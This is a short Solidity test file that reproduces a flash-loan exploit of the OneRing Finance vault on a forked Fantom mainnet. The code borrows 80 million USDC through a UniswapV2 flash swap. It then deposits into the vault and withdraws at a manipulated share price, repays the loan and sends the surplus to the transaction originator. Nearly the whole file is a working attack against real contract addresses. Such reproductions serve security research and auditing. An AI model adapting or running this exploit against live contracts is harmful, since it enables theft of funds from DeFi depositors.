// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "./interface.sol";

contract ContractTest is DSTest {
    IUniswapV2Pair pair = IUniswapV2Pair(0xbcab7d083Cf6a01e0DdA9ed7F8a02b47d125e682);
    IERC20 usdc = IERC20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);
    IOneRingVault vault = IOneRingVault(0x4e332D616b5bA1eDFd87c899E534D996c336a2FC);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    uint256 mainnetFork;
    
    function setUp() public {
        mainnetFork = cheats.createFork("https://rpc.ankr.com/fantom", 34041499);//fork fantom at block 34041499
        cheats.selectFork(mainnetFork);
    }

    function testExploit() public {
        emit log_named_uint("Before exploit, USDC  balance of attacker:", usdc.balanceOf(msg.sender));
     pair.swap(80000000*1e6,0,address(this),new bytes(1));
        emit log_named_uint("After exploit, USDC  balance of attacker:", usdc.balanceOf(msg.sender));
}
    function hook(address sender, uint amount0, uint amount1, bytes calldata data) external{
        usdc.approve(address(vault),type(uint256).max);
        vault.depositSafe(amount0,address(usdc),1);
        vault.withdraw(vault.balanceOf(address(this)),address(usdc));
        usdc.transfer(msg.sender,(amount0/9999*10000)+10000);
        usdc.transfer(tx.origin,usdc.balanceOf(address(this)));
    }
}
